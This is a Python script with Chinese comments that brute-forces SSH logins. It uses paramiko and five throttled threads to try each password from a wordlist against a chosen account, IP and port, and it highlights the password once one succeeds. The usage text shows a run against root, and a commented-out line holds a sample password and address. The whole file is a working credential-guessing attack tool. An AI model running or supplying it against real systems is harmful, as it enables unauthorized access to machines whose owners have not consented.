#coding:utf-8
import paramiko
import time
import sys
import threading
from colorama import Fore
"""
使用多线程中的信号量技术，定义一个时间点只有5个线程同时访问目标设备
"""
maxConnections = 5
snp = threading.Semaphore(value=maxConnections)

Find = False #定义一个脚本退出标志位，如果找到密码find为True
count = 0 #统计出一共测试多少次后成功找到密码


def connect(user,passwd,ip,release,port=22):
    """
    :param user: 帐号参数
    :param passwd: 密码参数
    :param ip: ip参数
    :param release: 释放锁标志位参数
    :param port: 端口参数
    本函数用于ssh连接目标设备进行帐号密码认证
    """
    GREEN = Fore.GREEN #找到后的密码以绿色标亮
    RESET = Fore.RESET

    global Find
    try:
        #starttime=time.time()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,port,username=user,password=passwd,auth_timeout=5)
        print(f'{GREEN}[+] {ip} login sesscesful,password is >>>{passwd}<<<{RESET}')
        Find = True #ssh连接成功并且帐号密码连接成功后find设置True
        ssh.close()

    except paramiko.ssh_exception.AuthenticationException as error_auth:
        #endtime=time.time()
        print(f'[-]{passwd} is error')
        release = True
        ssh.close()

    except paramiko.ssh_exception.SSHException as e:
        print(f'异常error：{e},连接过多等120秒')
        time.sleep(120)
        connect(user, passwd, ip,False,port)

    except Exception as e:
        print(f"最后这个error:{e}")
        time.sleep(120)
        print('睡120秒')
        connect(user, passwd, ip,False,port)

    finally:
        if release:
            snp.release()


#connect('root','p@ssw0rd!@#','192.168.211.230',22,)
def main():
    """
    把密码文件以只读的打开，循环每一行，在开始循环的时候就加一把锁，最多有5个线程一起执行connect函数
    :return:
    """
    global count

    if len(sys.argv) !=5:
        print("""
        用法：python <脚本名> <帐号> <密码字典> <目标服务器ip> <端口>
        例子：
        python sshdemo1.py root password.txt 192.168.10.1 22
        """)
        sys.exit(0)

    passwd_file = sys.argv[2]
    with open(passwd_file, mode='rt', encoding='utf-8-sig') as passwd_f:
        for passwd_line in passwd_f:
            if Find:
                print(f'assword is find')
                print(f'一共测试了：{count} 次密码')
                sys.exit(0)
            passwd = passwd_line.strip()
            """
            每一次for循环创建一个线程并且每一个线程拿一把锁，最多5个线程，5把锁
            后面的线程等待前面线程释放后抢占锁
            """
            snp.acquire()
            count += 1
            print("[-] Testing: " + str(passwd))
            t = threading.Thread(target=connect, args=(sys.argv[1], passwd,sys.argv[3],True,sys.argv[4]))
            t.start()

if __name__ == '__main__':
    main()




